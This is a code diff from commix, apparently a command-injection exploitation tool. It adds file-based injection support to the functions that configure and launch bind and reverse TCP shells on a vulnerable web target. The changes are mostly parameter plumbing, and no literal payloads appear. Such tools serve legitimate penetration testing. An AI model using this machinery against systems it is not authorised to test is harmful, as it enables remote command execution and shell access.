@@ -30,6 +30,7 @@ from src.core.shells import bind_tcp
 from src.core.shells import reverse_tcp
 from src.core.injections.results_based.techniques.classic import cb_injector
 from src.core.injections.results_based.techniques.eval_based import eb_injector
+from src.core.injections.semiblind.techniques.file_based import fb_injector
 
 """
 Check for established connection
@@ -54,7 +55,7 @@ def check_established_connection():
 """
 Execute the bind / reverse TCP shell
 """
-def execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option):
+def execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, payload, OUTPUT_TEXTFILE):
   if settings.EVAL_BASED_STATE != False:
     # Command execution results.
     start = time.time()
@@ -64,12 +65,15 @@ def execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_
     # Evaluate injection results.
     shell = eb_injector.injection_results(response, TAG, cmd)
   else:
-    whitespace = settings.WHITESPACE[0]
-    if whitespace == " ":
-      whitespace = urllib.quote(whitespace) 
     # Command execution results.
     start = time.time()
-    response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+    if settings.FILE_BASED_STATE == True:
+      response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+    else:
+      whitespace = settings.WHITESPACE[0]
+      if whitespace == " ":
+        whitespace = urllib.quote(whitespace) 
+      response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
     end = time.time()
     diff = end - start
     # Evaluate injection results.
@@ -88,14 +92,14 @@ def execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_
 """
 Configure the bind TCP shell
 """
-def bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again):
+def bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, payload, OUTPUT_TEXTFILE):
   settings.BIND_TCP = True
   # Set up RHOST / LPORT for the bind TCP connection.
   bind_tcp.configure_bind_tcp()
   if settings.BIND_TCP == False:
     if settings.REVERSE_TCP == True:
       os_shell_option = "reverse_tcp"
-      reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)
+      reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, payload, OUTPUT_TEXTFILE)
     return go_back, go_back_again
 
   while True:
@@ -112,23 +116,23 @@ def bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_reques
         settings.BIND_TCP = False
       elif result == 3:
         settings.BIND_TCP = False
-        reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)  
+        reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, payload, OUTPUT_TEXTFILE)  
       return go_back, go_back_again
 
     # execute bind TCP shell 
-    execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option)
+    execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, payload, OUTPUT_TEXTFILE)
 
 """
 Configure the reverse TCP shell
 """
-def reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again):
+def reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, payload, OUTPUT_TEXTFILE):
   settings.REVERSE_TCP = True
   # Set up LHOST / LPORT for the reverse TCP connection.
   reverse_tcp.configure_reverse_tcp()
   if settings.REVERSE_TCP == False:
     if settings.BIND_TCP == True:
       os_shell_option = "bind_tcp"
-      bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)
+      bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, payload, OUTPUT_TEXTFILE)
     return go_back, go_back_again
 
   while True:
@@ -145,17 +149,17 @@ def reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_req
         settings.REVERSE_TCP = False
       elif result == 3:
         settings.REVERSE_TCP = False
-        bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)
+        bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, payload, OUTPUT_TEXTFILE)
         #reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)  
       return go_back, go_back_again
 
     # execute reverse TCP shell  
-    execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option)
+    execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, payload, OUTPUT_TEXTFILE)
 
 """
 Check commix shell options
 """
-def check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again):
+def check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE):
   os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
 
   if os_shell_option == "back" or os_shell_option == True or os_shell_option == False:
@@ -172,12 +176,12 @@ def check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_m
 
   # The "bind_tcp" option
   elif os_shell_option == "bind_tcp":
-    go_back, go_back_again = bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)
+    go_back, go_back_again = bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, payload, OUTPUT_TEXTFILE)
     return go_back, go_back_again
 
   # The "reverse_tcp" option
   elif os_shell_option == "reverse_tcp":
-    go_back, go_back_again = reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)
+    go_back, go_back_again = reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again, payload, OUTPUT_TEXTFILE)
     return go_back, go_back_again
 
   # The "quit" option
